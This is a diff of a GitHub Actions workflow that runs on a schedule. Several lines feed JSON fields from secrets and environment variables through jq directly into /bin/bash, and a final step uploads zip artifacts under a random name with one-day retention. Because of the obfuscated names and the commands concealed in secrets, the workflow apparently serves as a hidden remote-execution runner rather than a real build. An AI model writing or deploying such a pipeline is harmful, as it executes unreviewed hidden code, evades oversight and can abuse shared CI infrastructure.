@@ -1,27 +1,26 @@
 name: traceseancoder
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '27 0/6 * * *'
+    - cron: '47 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: traceseancoder
         env:
-          isyf7: ${{ secrets.isyf7 }}
+          gw385: ${{ secrets.gw385 }}
         run: |
-          echo $isyf7 | jq -r .p210 | /bin/bash
-          echo $t2 | jq -r .ha756 | /bin/bash
-          echo $qjyk39 | jq -r .wji7 | /bin/bash
-          echo $asril7505 | jq -r .p1857 | /bin/bash
-          echo $nn7 | jq -r .r290 | /bin/bash
-          echo $kcko42 | jq -r .iln38911 | /bin/bash
-          echo $qbe167 | jq -r .jr1 | /bin/bash
-          echo $myv569 | jq -r .vub6972 | /bin/bash
-          echo $jl329 | jq -r .kc6 | /bin/bash
-          echo $f42710 | jq -r .sjdit12997 | /bin/bash
+          printf '%s' "$gw385" | jq -r .alfhi69 | /bin/bash
+          echo $ju6111 | jq -r .dlg12598 | /bin/bash
+          printf '%s' "$si85033" | jq -r .fy5231 | /bin/bash
+          echo $bptwk90 | jq -r .rnjlz1 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1xg0X1QF
+          path: "*.zip"
+          retention-days: 1
